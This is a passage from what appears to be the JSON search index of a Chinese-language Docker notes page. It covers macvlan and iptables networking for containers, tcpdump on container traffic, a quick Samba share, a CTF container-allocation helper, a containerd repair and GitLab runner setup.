nginx\n</code></pre> <p>\u73b0\u5728\u4f60\u53ef\u4ee5\u8bbf\u95ee <code>http://10.1.1.100</code> \u6765\u770b\u5230nginx\u7684\u6b22\u8fce\u9875\u9762\u4e86\uff0c\u4f60\u9700\u8981\u5728\u5185\u7f51\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u8bbf\u95ee\uff08\u6211\u7684\u53d1\u73b0\u662f\u4e3b\u673a\u548c\u8fd9\u6837\u5206\u914d\u7684\u5bb9\u5668\u662f\u4e0d\u4e92\u901a\u7684\uff09</p> <p>\u53ef\u80fd\u7684IP\u51b2\u7a81</p> <p>\u542f\u52a8\u5bb9\u5668\u65f6\u53ef\u4ee5\u4e0d\u6307\u5b9aip\u8ba9docker\u81ea\u52a8\u5206\u914d\uff0c\u8b66\u544a\uff1a\u5982\u679c\u6ca1\u6709\u914d\u7f6eip-range\u53c2\u6570\uff0c\u6709\u53ef\u80fd\u88ab\u5206\u914d\u7684\u6070\u597d\u662f\u4e3b\u673a\u672c\u8eab\u7684IP\uff0c\u8fd9\u79cd\u60c5\u51b5\u5c06\u5bfc\u81f4\u4e3b\u673a\u4e22\u5931IP\u65e0\u6cd5\u8054\u7f51\uff01</p> <p>\u4e07\u4e00\u53d1\u751f\u8fd9\u79cd\u865a\u62df\u673a\u628a\u4e3b\u673a\u7684IP\u62a2\u5360\u7684\u60c5\u51b5\uff0c\u5728\u6ca1\u6709\u7269\u7406\u63a7\u5236\u65b9\u6cd5\u4e0b\u4e0d\u53ef\u8f7b\u6613\u4f7f\u7528ifconfig\u4fee\u6539\u4e3b\u673aIP\uff0c\u56e0\u4e3a\u4e00\u65e6\u4f7f\u7528ifconfig\u4e3b\u673a\u7684route\u5c06\u88ab\u6e05\u7a7a\u3001\u5f53\u524d\u4e3b\u673a\u7684\u5176\u4ed6IP\u4e5f\u4f1a\u4e22\u5931\uff0c\u4f60\u5c31\u4e22\u5931\u8fdc\u7a0b\u8bbf\u95ee\u7684\u53ef\u80fd\u4e86\uff08\u4e5f\u8bb8\u4f60\u53ef\u4ee5\u5199\u4e00\u4e2a\u811a\u672c\u81ea\u52a8\u6062\u590droute\u7a33\u59a5\u4e00\u70b9\uff09\uff1b\u4f46\u795e\u5947\u7684\u662f\u5373\u4f7f\u4e3b\u673aroute\u5df2\u7ecf\u4e22\u5931\uff0c\u6309\u7167\u4e0a\u8ff0macvlan\u5f00\u51fa\u6765\u7684Docker\u5bb9\u5668\u4ecd\u7136\u5728\u7ebf\uff08\u4e5f\u53ef\u4ee5\u7406\u89e3\u2014\u2014\u5bb9\u5668\u7684route\u5e76\u6ca1\u6709\u53d7\u5230\u5f71\u54cd\uff0c\u7c7b\u4f3c\u4e8eVirtualbox\u7684\u6865\u63a5\u7f51\u5361\u65b9\u5f0f\uff09</p>"},{"location":"Docker/#macvlanip","title":"\u83b7\u53d6macvlan\u5bb9\u5668\u7684IP","text":"<p>@TAG getip</p> <pre><code># clean version\ndocker inspect --format \"{{.NetworkSettings.Networks.macvlan\u7f51\u7edc\u540d\u79f0.IPAddress}}\" \u5bb9\u5668\u540d\u79f0\n\n# dirty but quick version\ndocker inspect \u5bb9\u5668\u540d\u79f0 | grep IP\n</code></pre>"},{"location":"Docker/#macvlanip_1","title":"macvlan\u67e5\u770b\u5df2\u7ecf\u5206\u914d\u7684IP","text":"<p>\u7531\u4e8e\u4e3b\u673a\u548c\u5bb9\u5668\u4e0d\u80fd\u4e92\u901a\uff0c\u6240\u4ee5\u4e3b\u673a\u5982\u4f55\u5f97\u77e5\u76ee\u524d\u5df2\u7ecf\u5206\u914d\u7684IP\u5217\u8868\u5462\uff1f\u7528docker network inspect\u54af\uff0c\u7136\u540e\u7528python\u5904\u7406\u4e00\u4e0b\u8f93\u51fa\u683c\u5f0f</p> <p>\u4e0b\u9762\u8fd9\u4e2a\u547d\u4ee4\u5217\u51fa\u4e86\u5bb9\u5668IP\u548c\u5bb9\u5668\u540d\u79f0\uff1a</p> <pre><code>docker network inspect macvlan_bridge --format \"{{range .Containers}}{{.IPv4Address}}@{{.Name}},,,{{end}}\" | python3 -c 'print(input().replace(\"/24@\",\"\\t\").replace(\",,,\",\"\\n\"),end=\"\")'|sort\n</code></pre> <p>\u5982\u679c\u53ea\u9700\u8981IP\u5217\u8868\uff1a</p> <pre><code>docker network inspect macvlan_bridge --format \"{{range .Containers}}{{.IPv4Address}},{{end}}\" | python3 -c 'print(input().replace(\"/24,\",\"\\n\"),end=\"\")'|sort\n</code></pre>"},{"location":"Docker/#macvlan","title":"\u4e3b\u673a\u8bbf\u95eemacvlan\u7684\u5bb9\u5668","text":"<p>\u7531\u4e8e\u5185\u6838\u9650\u5236\u5e76\u4e0d\u652f\u6301host\u76f4\u63a5\u4f7f\u7528\u4e0a\u8ff0\u6307\u5b9a\u7684ip\u8bbf\u95ee\u5bb9\u5668\uff0c\u800cdocker network connect\u8ba9\u5bb9\u5668\u518d\u52a0\u5165\u4e00\u4e2a\u7f51\u7edc\u53c8\u4f1a\u6539\u53d8\u5bb9\u5668\u7684\u9ed8\u8ba4\u8def\u7531\uff0c\u4f46\u6211\u5c31\u662f\u60f3\u8ba9\u4e3b\u673a\u80fd\u8bbf\u95ee\u5230\u5bb9\u5668\uff0c\u548b\u529e\u54e9\uff1f</p> <p>\u53c2\u8003\uff1ahttp://blog.oddbit.com/2018/03/12/using-docker-macvlan-networks/</p> <p>\u60f3\u8bbf\u95ee\u7684\u5bb9\u5668IP\u4e3a10.1.1.66\uff0c\u8fd9\u79cd\u65b9\u6cd5\u9700\u8981\u8ba9\u4e3b\u673a\u518d\u83b7\u5f97\u4e00\u4e2aIP\uff0c\u4f8b\u598210.1.1.3\u3002\u6ce8\u610f\u8fd9\u79cd\u914d\u7f6e\u662f\u4e0d\u6301\u4e45\u7684\uff0c\u91cd\u542f\u540e\u4e22\u5931</p> <pre><code>DEVICE_NAME=\"eth0\"\nNAME=\"mynet-shim\"\nHOST_GETIP=\"10.1.1.3\"\nTARGET_IP=\"10.1.1.66\"\n\nip link add $NAME link $DEVICE_NAME type macvlan  mode bridge\nip addr add $HOST_GETIP/32 dev $NAME\nip link set $NAME up\nip route add $TARGET_IP/32 dev $NAME\n</code></pre>"},{"location":"Docker/#iptablesdockerip","title":"\u4f7f\u7528iptables\u7aef\u53e3\u8f6c\u53d1\u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP","text":"<p>\u4e0a\u8ff0\u57fa\u4e8emacvlan\u7684\u65b9\u6cd5\u5bb9\u5668\u65e0\u6cd5\u4e0e\u4e3b\u673a\u901a\u8baf\uff0c\u6240\u4ee5\u4e0b\u8ff0\u57fa\u4e8eiptables\u7aef\u53e3\u8f6c\u53d1\u7684\u65b9\u6cd5\u66f4\u80dc\u4e00\u7b79</p> <p>\u8fd9\u79cd\u65b9\u6cd5\u57fa\u4e8e\u4e3b\u673a\u81ea\u5df1\u53bb\u83b7\u5f97\u4e00\u4e2a\u989d\u5916\u7684\u5185\u7f51ip\u540e\uff0c\u7528iptables\u7aef\u53e3\u8f6c\u53d1\u6765\u5b9e\u73b0\u7ed9\u5bb9\u5668\u5185\u7f51IP\u7684\u6548\u679c\uff0c\u5bb9\u5668\u5e94\u7528\u53ef\u4ee5\u5f97\u5230\u8bf7\u6c42\u6e90IP\uff0c\u4f46\u5bb9\u5668\u5411\u5916\u53d1\u8d77\u7684tcp\u8bf7\u6c42\u8fd8\u662f\u4e3b\u673a\u81ea\u8eab\u7684\u9ed8\u8ba4IP</p> <p>\u8be5\u811a\u672c\u8fd0\u884c\u65f6\u9700\u8981\u4e24\u4e2a\u53c2\u6570 \u7b2c\u4e00\u4e2a\u4e3a\u5bb9\u5668\u540d\u79f0 \u7b2c\u4e8c\u4e2a\u4e3a\u65b0\u7684IP\u540e\u7f00</p> <p>\u4e3e\u4e2a\u4f8b\u5b50 \u4e3b\u673a\u572810.12.34.x\u8fd9\u4e2a\u5185\u7f51\u5730\u5740\u6bb5 \u4e14\u53ef\u4ee5\u968f\u610f\u5f97\u5230\u8fd9\u4e2a\u5730\u5740\u6bb5\u7684\u5185\u7f51IP\uff0c\u73b0\u5728\u8981\u7ed9mysql\u5bb9\u566810.12.34.202\u8fd9\u4e2aIP\uff0c\u8fd0\u884c\u65b9\u5f0f\u5c31\u662f<code>./give_container_ip.sh mysql 202</code></p> <p>\u8bb0\u5f97\u4fee\u6539\u4e0b\u9762\u7684IPPREFIX\u548cETH0\u53d8\u91cf\uff01</p>"},{"location":"Docker/#give_container_ipsh","title":"give_container_ip.sh","text":"<p>@TAG \u7aef\u53e3\u8f6c\u53d1</p> <pre><code>#!/bin/bash\nset -ex\nshopt -s expand_aliases\n\nif [ -z $1 ] &amp;&amp; [ -z $2 ]; then\necho \"Usage: $0 &lt;container name&gt; &lt;new IP suffix&gt;\"\necho \"Example: $0 u202 202\"\nexit 1\nfi\n\nalias getip=\"docker inspect  --format '{{.NetworkSettings.IPAddress}}' \"\n\nIPPREFIX=\"10.12.34.\"\nETH0=\"eth0\"\nsudo ifconfig $ETH0:$2 $IPPREFIX$2 netmask 255.255.255.0 up\nsudo iptables -t nat -I PREROUTING -d $IPPREFIX$2 -p tcp -j DNAT --to `getip $1`\nsudo iptables -t nat -I POSTROUTING -s `getip $1`/32 -d `getip $1`/32 -p tcp -m tcp -j MASQUERADE\n</code></pre> <p>\u4e3a\u4ec0\u4e48\u6700\u540e\u7528MASQUERADE\u800c\u4e0d\u7528SNAT\u5462\uff1f\u56e0\u4e3a\u7528SNAT\u5bb9\u5668\u7684\u5e94\u7528\u5c31\u4e0d\u80fd\u5f97\u5230\u8bf7\u6c42\u7684\u6e90IP\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u662f\u65e0\u6cd5\u63a5\u53d7\u7684\uff1b\u8fd9\u4e00\u6761iptables\u89c4\u5219\u662f\u6211\u7528<code>docker run -p</code>\u548c<code>iptables-save</code>\u5f97\u5230\u7684</p>"},{"location":"Docker/#tcpdump","title":"\u5bf9\u5bb9\u5668\u7f51\u7edc\u6d41\u91cftcpdump","text":"<p>Learned from: https://www.slideshare.net/SreenivasMakam/docker-networking-common-issues-and-troubleshooting-techniques</p> <pre><code>docker run -ti --net container:&lt;containerid&gt; nicolaka/netshoot tcpdump -i eth0 -n port 80\n</code></pre> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u4e0a\u8ff0\u542f\u52a8\u4e86nginx\u5bb9\u5668\u5e76\u5206\u914d\u4e86\u5185\u7f51ip 10.1.1.100\uff0c\u6211\u4eec\u6765\u6536\u96c680\u7aef\u53e3\u7684\u6d41\u91cf\uff0c\u5e76\u4fdd\u5b58\u5230/tmp/pcapfiles/nginx.pcap\u6587\u4ef6\uff1a</p> <pre><code>docker run -ti --net container:f5fc -v /tmp/pcapfiles:/data nicolaka/netshoot tcpdump -i eth0 -n -s0 -w /data/nginx.pcap port 80\n</code></pre> <p>\u67e5\u770btcpdump\u53c2\u6570\u89e3\u91caexplainshell</p>"},{"location":"Docker/#_9","title":"\u4fee\u6539\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\u7684\u91cd\u542f\u7b56\u7565","text":"<p>docker run\u7684\u65f6\u5019\u5fd8\u4e86\u6307\u5b9arestart=always\uff0c\u9664\u4e86commit\u540e\u518d\u6b63\u786e\u5730run\u4e00\u904d\u4e4b\u5916\u6709\u6ca1\u6709\u66f4\u52a0\u4f18\u96c5\u7684\u4fee\u6539\u5bb9\u5668\u53c2\u6570\u7684\u65b9\u6cd5\u5462\uff1f</p> <p>\u53c2\u8003\uff1a https://stackoverflow.com/questions/26852321/docker-add-a-restart-policy-to-a-container-that-was-already-created</p> <p>\u57281.11\u7248\u672c\u540e\u6709\u4e86<code>docker update</code>\u8fd9\u4e2a\u547d\u4ee4\uff0c\u53ef\u4ee5\u4fee\u6539\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\u7684\u53c2\u6570\uff0c\u5982CPU\u9650\u5236\u3001\u5185\u5b58\u9650\u5236 \u548c \u91cd\u542f\u7b56\u7565</p> <p>\u4f7f\u76ee\u524d\u8fd0\u884c\u7684\u6240\u6709\u5bb9\u5668\u90fd\u8bbe\u7f6e\u4e3a\u81ea\u52a8\u91cd\u542f\uff1a</p> <pre><code>docker update --restart=always `docker ps -q`\n</code></pre> <p>\u5982\u679c\u8981\u53d6\u6d88\u8fd9\u4e2a\u81ea\u52a8\u91cd\u542f\uff0c\u6539\u4e3a<code>--restart=no</code>\u5373\u53ef</p>"},{"location":"Docker/#samba","title":"\u5feb\u901f\u90e8\u7f72samba","text":"<p>@TAG share</p> <p>\u955c\u50cf\u5730\u5740\uff1adperson/samba</p> <p>\u5feb\u901f\u5206\u4eab\u4e00\u4e2a\u76ee\u5f55/data\uff0c\u7528\u6237\u540d<code>user</code>\u5bc6\u7801<code>badpassword</code>\uff1a</p> <pre><code>docker run -d -p 139:139 -p 445:445 --name samba -v /data:/data dperson/samba -u \"user;badpassword\" -s \"data;/data;yes;no;no;all\"\n</code></pre> <p>\u5176\u4e2d-u\u6307\u5b9a\u7528\u6237\u540d\u5bc6\u7801\uff1b-s\u53c2\u6570\u7684\u683c\u5f0f\u4e3a\uff1a</p> <p>\u7ed9\u8bbf\u95ee\u8005\u770b\u7684\u5206\u4eab\u540d\u79f0;\u7269\u7406\u4f4d\u7f6e;\u662f\u5426\u5217\u51fa;\u672a\u767b\u5f55\u53ef\u5426\u8bbf\u95ee;\u5141\u8bb8\u8bbf\u95ee\u7684\u7528\u6237(all\u8868\u793a\u6240\u6709\u7528\u6237)</p>"},{"location":"Docker/#_10","title":"\u6309\u9700\u5206\u914d\u5bb9\u5668 \u8fc7\u671f\u81ea\u52a8\u9500\u6bc1","text":"<p>@TAG ctf xinetd</p> <p>\u6709\u4e9b\u9898\u76ee\u9700\u8981\u7ed9\u6bcf\u4e2a\u4eba\u5355\u72ec\u7684\u5bb9\u5668\uff0c\u4e3a\u4e86\u8282\u7ea6\u8d44\u6e90\u8fd8\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u65f6\u95f4\uff0c\u8fc7\u671f\u540e\u81ea\u52a8\u5220\u9664\u5bb9\u5668</p> <p>\u4e3a\u4e86\u9632\u6b62\u6ee5\u7528\u8fd8\u8981\u5f15\u5165Proof Of Work\uff0c\u56de\u7b54\u6b63\u786e\u540e\u624d\u5206\u914d\u5bb9\u5668</p> <p>Warning</p> <p>\u8be5\u4ee3\u7801\u76f4\u63a5\u7528\u7684docker\u547d\u4ee4\u6765\u521b\u5efa\u5bb9\u5668\uff0c\u4e14\u9700\u8981root\u6743\u9650\uff0c\u6ce8\u610f\u4f7f\u7528\u4e0a\u7684\u5b89\u5168\u98ce\u9669</p> <p>\u4ee3\u7801\u5982\u4e0b\uff1a<code>utils.py</code></p> <pre><code>#/usr/bin/python3\n#coding:utf-8\nimport subprocess\nimport time\nimport string\nimport os\nimport hashlib\nimport random\nfrom random import randint\n\n# \u9650\u65f6\u8bbe\u5b9a\ndef clock(timeout=5):\n    import signal\n    def signal_handler(signum,data):\n        if signum == signal.SIGALRM:\n            print(\"Time is up!\")\n            exit()\n    signal.signal(signal.SIGALRM, signal_handler)\n    signal.alarm(int(timeout))\n\n# \u751f\u6210\u968f\u673a\u5b57\u7b26\u4e32\ndef randomstring(len=5):\n    return ''.join(random.sample(string.ascii_letters,len))\n\n# \u8ba1\u7b97md5\ndef md5(src):\n    return hashlib.md5(bytes(src,encoding='utf-8')).hexdigest()\n\n# \u663e\u793a\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u8981\u6c42\u7528\u6237\u8ba1\u7b97\u5176md5\ndef pow_calcmd5():\n    question = randomstring()\n    answer = md5(question)\n    print(\"Please calculate md5(%s)=\"%question,end='')\n    if input()!=answer:\n        exit()\n\n# \u663e\u793a\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u8981\u6c42\u7528\u6237\u8f93\u5165\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\u6ee1\u8db3md5\u4ee5difficulty\u4e2a0\u5f00\u5934\ndef pow_realmd5(difficulty=4):\n    question = randomstring()\n    print(\"[Proof Of Work]\")\n    print(\"Please calculate s, make that \\n    md5(\\\"%s\\\"+s).startswith('%s')\"%(question,'0'*difficulty))\n    print(\"Input your s:\",end='')\n    s = input()\n    if not md5(question+s).startswith('0'*difficulty):\n        exit()\n\n# \u4ece\u955c\u50cf\u542f\u52a8\u5bb9\u5668\ndef start_container(image, port, paramstring):\n\"\"\"\n    image:\u955c\u50cf\u540d\u79f0\n    port: \u9700\u8981\u6620\u5c04\u7684\u7aef\u53e3\n    paramstring: \u989d\u5916\u7684\u53c2\u6570\u8bbe\u7f6e\u5b57\u7b26\u4e32 \u5982\"-v /d/blabla:/data\"\n\n    \u8fd4\u56de(\u5bb9\u5668ID, \u6620\u5c04\u5f97\u5230\u7684\u7aef\u53e3)\n    \"\"\"\n    container = subprocess.check_output(\"docker run -d -p :\"+str(port)+\" \"+paramstring+\" \"+image+\" /run.sh\",shell=True).decode().replace(\"\\n\",\"\")\n    inspect = subprocess.check_output(\"docker inspect --format '{{.NetworkSettings.Ports}}' %s\"%container,shell=True).decode().replace(\"\\n\",\"\")\n    openport = inspect.split(\"{\")[1].split()[1].split(\"}\")[0]\n    return (container, openport)\n\n# \u8ba1\u5212\u5728minutes\u5206\u949f\u540e\u9500\u6bc1\u5bb9\u5668container \u9700\u8981atd\u670d\u52a1\ndef plan_stop_container(container, minutes):\n    PATH = os.getcwd()\n    minutes = str(minutes)\n    filename = \"%s_%d\"%(time.strftime(\"%Y_%m_%d_%H_%M_%S\"),randint(0,666))\n    open(PATH+\"/\"+filename,\"w\").write(\"docker kill %s &amp;&amp; docker rm %s &amp;&amp; rm %s/%s\"%(container,container,PATH,filename))\n    subprocess.check_output(\"at now + %s minutes -f %s 2&gt;/dev/null\"%(minutes,filename),shell=True)\n\n# \u751f\u6210\u4e00\u4e2arunner\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0cxinetd\u5e76\u4e0d\u652f\u6301\u76f4\u63a5\u8fd0\u884cpython\nif __name__ == \"__main__\":\n    print(\"[*] writing to runner.c\")\n    path = os.getcwd()\n    open(\"runner.c\",\"w\").write(\"\"\"#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\nint main(){\n   chdir(\"%s\");\n   system(\"python3 %s/runner.py\");\n   return 0;\n}\n\"\"\"%(path, path))\n    print(\"[*] compile runner.c to runner\")\n    os.system(\"gcc runner.c -o runner\")\n</code></pre> <p>\u7528\u5230\u7684xinetd\u914d\u7f6e\uff1a<code>runner.conf</code>\uff0c\u6ce8\u610f\u4fdd\u5b58\u7684\u65f6\u5019\u4e0d\u80fd\u6709\\r <code>:set ff=unix</code></p> <pre><code>service \u9898\u76ee\u540d\u79f0\n{\n    socket_type = stream\nprotocol    = tcp\nwait        = no\nuser        = root\nbind        = 0.0.0.0\nserver      = /\u7edd\u5bf9\u8def\u5f84/runner\ntype        = UNLISTED\nport        = \u7aef\u53e3\u53f7\n    disable = no\n}\n</code></pre>"},{"location":"Docker/#ab","title":"\u5728\u5bb9\u5668A\u4e2d\u4f7f\u7528\u522b\u540d\u8bbf\u95ee\u5bb9\u5668B","text":"<p>\u5bb9\u5668A\u662fweb\u5e94\u7528\uff0c\u9700\u8981\u8bbf\u95eeredis\u7684\u5bb9\u5668B\uff0c\u5982\u679c\u7528docker inspect\u62ff\u5230\u73b0\u5728\u5bb9\u5668B\u7684IP\u5199\u5165\u5230\u914d\u7f6e\uff0c\u4e00\u65e6docker\u91cd\u542f\u8fd9\u4e2a\u5bb9\u5668IP\u5c31\u4f1a\u53d1\u751f\u53d8\u5316</p> <p>\u66f4\u597d\u7684\u65b9\u5f0f\u662f\u4f7f\u7528docker\u7684\u81ea\u5b9a\u4e49\u7f51\u7edc\uff1a\u521b\u5efa\u7f51\u7edc\uff0c\u628aredis\u52a0\u5165\u7f51\u7edc\uff0c\u628aapp\u52a0\u5165\u7f51\u7edc</p> <pre><code>docker network create useredis\ndocker network connect --alias redis useredis redis\ndocker network connect --alias app useredis app\n</code></pre> <p>\u5728\u52a0\u5165\u7f51\u7edc\u7684\u65f6\u5019\u6307\u5b9a\u2013alias\u5373\u53ef\uff0c\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u5bb9\u5668\u5c31\u80fd\u901a\u8fc7\u8fd9\u4e2aalias\u8bbf\u95ee\u5230\uff0c\u8fd9\u6837\u64cd\u4f5c\u540eapp\u5bb9\u5668\u91cc\u9762\u5c31\u80fdping redis\u4e86</p>"},{"location":"Docker/#docker1802start","title":"\u4fee\u590dDocker\u66f4\u65b0\u523018.02\u540e\u90e8\u5206\u5bb9\u5668\u65e0\u6cd5start\u7684\u95ee\u9898","text":"<p>apt\u8bf4\u53ef\u4ee5\u66f4\u65b0\uff0c\u4e8e\u662f\u5c31\u66f4\u65b0\u4e86\uff0c\u7136\u800c\u5374\u60b2\u50ac\u5730\u53d1\u73b0\u90e8\u5206\u5bb9\u5668\u65e0\u6cd5\u542f\u52a8\uff0c\u62a5\u9519\u4fe1\u606f\uff1a</p> <pre><code>docker start &lt;container_name&gt; returns \"container &lt;hash&gt; already exists\"\n</code></pre> <p>Google\u627e\u5230\u4e86\u76f8\u5173issue\u5728\u8fd9\u91cc</p> <p>\u4e0d\u5220\u5bb9\u5668\u91cd\u5efa\u3001\u4e0d\u56de\u6edaDocker\u7684\u89e3\u51b3\u65b9\u6848\u4e3a\uff1a</p> <pre><code>sudo docker-containerd-ctr --namespace moby --address /run/docker/containerd/docker-containerd.sock c rm `docker inspect --format '{{.Id}}' \u65e0\u6cd5\u542f\u52a8\u7684\u5bb9\u5668\u540d\u79f0`\n</code></pre> <p>\u6ce8\u610f\u9700\u8981\u8f93\u5165\u7684\u662f\u90a3\u4e2a\u5f88\u957f\u7684\u5bb9\u5668id\uff0c\u6240\u4ee5\u5148\u7528docker inspect\u83b7\u53d6\u5176\u957fId</p> <p>\u5982\u679cdocker-containerd-ctr \u4e0d\u5b58\u5728\uff0c\u4e5f\u8bb8\u4f60\u4f7f\u7528\u7684\u662fDocker for mac\uff0c\u9700\u8981\u8fd9\u4e48\u64cd\u4f5c\uff1a</p> <pre><code>docker run -it --rm -v /:/host alpine /host/usr/local/bin/docker-containerd-ctr  --namespace moby --address /host/run/docker/containerd/docker-containerd.sock c rm \u51fa\u9519\u7684\u5bb9\u5668id\n</code></pre>"},{"location":"Docker/#docker-exec-it","title":"\u89e3\u51b3docker exec -it\u8fdb\u5165\u5bb9\u5668\u5c4f\u5e55\u5927\u5c0f\u4e0d\u5bf9\u7684\u95ee\u9898","text":"<p>\u53d1\u73b0docker exec -it\u8fdb\u5165\u5bb9\u5668\u7684bash\u540etty\u7684\u5927\u5c0f\u4e0d\u5bf9 \u53ea\u670980x24\uff0c\u53c2\u8003\u8fd9\u4e2a https://github.com/moby/moby/issues/35407</p> <p>\u89e3\u51b3\u65b9\u6848\uff1a\u5728\u8fdb\u5165\u5bb9\u5668\u65f6\u914d\u7f6e\u73af\u5883\u53d8\u91cfCOLUMNS\u548cLINES\u4e3a\u6b63\u786e\u503c\u5373\u53ef\uff0c\u4e3a\u4e86\u4fbf\u4e8e\u64cd\u4f5c\u4e0e\u8bb0\u5fc6\uff0c\u5199~/.bashrc\u54af\uff1a</p> <pre><code>function din(){\n    docker exec -ti --env COLUMNS=`tput cols` --env LINES=`tput lines` $1 /bin/bash\n}\nalias din=din\n</code></pre> <p>\u4f7f\u7528\u7684\u65f6\u5019\u53ea\u9700\u8981<code>din \u5bb9\u5668\u540d\u79f0</code>\u5c31\u80fd\u8fdb\u5165\u5bb9\u5668bash\u5566\uff0c\u8fd9\u6837\u8fdb\u5165\u5bb9\u5668vim\u4e5f\u80fd\u5168\u5c4f\u5e55\u663e\u793a\u4e86</p>"},{"location":"Docker/#docker-pull","title":"\u4e0d\u4f7f\u7528docker pull\u4e5f\u80fd\u4e0b\u8f7d\u5230\u955c\u50cf","text":"<p>\u8be5\u811a\u672c\u5b58\u5728\u95ee\u9898\uff0c\u4e0b\u8f7d\u5230\u7684\u955c\u50cf\u5c42\u53ef\u80fd\u65e0\u6cd5\u5bfc\u5165\uff0c\u4ecd\u5f85\u7814\u7a76</p> <p>github\u4e0a\u5b98\u65b9\u6709\u4e0b\u8f7d\u811a\u672c\uff1a https://github.com/moby/moby/blob/master/contrib/download-frozen-image-v2.sh</p> <p>\u4f7f\u7528\u7684\u65f6\u5019\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u76ee\u5f55\u540d\u79f0\uff0c\u7b2c\u4e8c\u4e2a\u662f\u955c\u50cf\u540d\u79f0:latest\uff0c\u5176\u4e2d:tag\u662f\u5fc5\u987b\u8981\u5199\u7684</p> <p>\u4e0b\u8ff0\u547d\u4ee4\u4e0b\u8f7d\u811a\u672c\uff0c\u66ff\u6362\u4e3a\u4ece\u963f\u91cc\u4e91\u4e0b\u8f7d\uff0c\u6700\u540e\u6253\u5305\u6210golang.tar \uff08\u7531\u4e8e\u4e0b\u8f7d\u5230\u7684layer\u7684tar\u5305\u5df2\u7ecf\u662fgzip\u538b\u7f29\u8fc7\u7684 \u6ca1\u5fc5\u8981\u518d7zip\u538b\u7f29\uff09</p> <pre><code>wget https://raw.githubusercontent.com/moby/moby/master/contrib/download-frozen-image-v2.sh\nsed -i 's/registry-1.docker.io/h0kyslzs.mirror.aliyuncs.com/g' download-frozen-image-v2.sh\nsed -i 's/token=\"$(/token=\"\" #/g' download-frozen-image-v2.sh\nchmod +x download-frozen-image-v2.sh\n./download-frozen-image-v2.sh /tmp/golang google/golang:latest\ntar -vf golang.tar -cC '/tmp/golang' . </code></pre> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u4f20\u8f93golang.tar\uff0c\u5bfc\u5165\u65b9\u6cd5\u5f88\u7b80\u5355</p> <pre><code>docker load &lt; golang.tar\n</code></pre>"},{"location":"Docker/#docker-daemon","title":"\u542f\u52a8\u53e6\u4e00\u4e2aDocker Daemon\u8fdb\u7a0b","text":"<p>\u6709\u65f6\u5019\u9700\u8981\u8fdb\u884cbuild\u64cd\u4f5c\uff0c\u53d1\u73b0\u6839\u76ee\u5f55\u5269\u4f59\u7a7a\u95f4\u4e0d\u591f\u4e86\uff0c\u4f46\u53e6\u5916\u4e00\u5757\u786c\u76d8\u8fd8\u6709\u7a7a\u95f4\uff0c\u6574\u4f53\u8fc1\u79fb/var/lib/docker\u6216\u5408\u5e76\u4e24\u4e2a\u786c\u76d8\u4e3alvm\u53c8\u4e0d\u73b0\u5b9e\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u5f00\u542f\u4e00\u4e2a\u65b0\u7684Docker Daemon\uff0c\u628aDocker\u4f7f\u7528\u7684\u76ee\u5f55\u8bbe\u7f6e\u4e3a\u53e6\u4e00\u5757\u786c\u76d8</p> <p>\u53c2\u8003\uff1ahttp://blog.alpaca.ai/run-multiple-docker-daemons-with-net-container/</p> <p>docker\u5de5\u4f5c\u76ee\u5f55\u5047\u8bbe\u4e3a/home/cy/docker</p> <p>\u7b2c\u4e00\u6b21\u6267\u884c\uff1a</p> <pre><code>OFFSET=0\nu=\"cy\"\nBRIDGE_NAME=br_${u}\nDOCKER_ROOT=/home/${u}/docker\nmkdir -p ${DOCKER_ROOT}\nbrctl addbr ${BRIDGE_NAME}\nSUBNET=$(expr 52 + ${OFFSET})\nip addr add 172.18.${SUBNET}.1/24 dev ${BRIDGE_NAME}\nip link set dev ${BRIDGE_NAME} up\niptables -t nat -A POSTROUTING -j MASQUERADE -s 172.18.${SUBNET}.0/24 -d 0.0.0.0/0\n</code></pre> <p>\u8fd0\u884cdockerd\u6267\u884c\uff1a</p> <pre><code>u=\"cy\"\nBRIDGE_NAME=br_${u}\nDOCKER_ROOT=/home/${u}/docker\n      dockerd -D \\\n        -g ${DOCKER_ROOT}/g \\\n        --exec-root=${DOCKER_ROOT}/e \\\n        -b ${BRIDGE_NAME} \\\n        --dns=8.8.8.8 \\\n        --iptables=true \\\n        -H unix://${DOCKER_ROOT}/docker.sock \\\n        -p ${DOCKER_ROOT}/docker.pid\n</code></pre>"},{"location":"Docker/#dockergitlab-ci","title":"\u914d\u7f6e\u4f7f\u7528Docker\u7248\u672c\u7684Gitlab CI","text":"<p>\u53c2\u8003\u6587\u6863\uff1a</p> <ul> <li>\u5b98\u65b9\u6559\u7a0b https://docs.gitlab.com/runner/</li> <li>\u9ad8\u7ea7\u914d\u7f6e https://docs.gitlab.com/runner/configuration/advanced-configuration.html</li> </ul> <p>\u4eba\u5bb6\u8fd9\u4e1c\u897f\u672c\u8d28\u4e0a\u662f\u4e00\u4e2adocker\u5bb9\u5668\uff0c\u4f46\u662f\u628a\u4e3b\u673a\u7684docker sock\u4f20\u5165\u5230\u5bb9\u5668\u4e2d\uff0c\u6240\u4ee5\u5bb9\u5668\u5185\u53ef\u4ee5\u521b\u5efa\u5bb9\u5668</p> <p>\u6211\u8fd9\u91cc\u7684\u6559\u7a0b\u7740\u91cd\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\uff1a\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\u955c\u50cf\uff0c\u8bbe\u7f6eDNS</p>"},{"location":"Docker/#pullrunner","title":"\u7b2c\u4e00\u6b65\u5f53\u7136\u662fpull\u4eba\u5bb6\u7684runner\u955c\u50cf\u54af","text":"<pre><code>docker pull gitlab/gitlab-runner\n</code></pre>"},{"location":"Docker/#citoken","title":"\u7b2c\u4e8c\u6b65 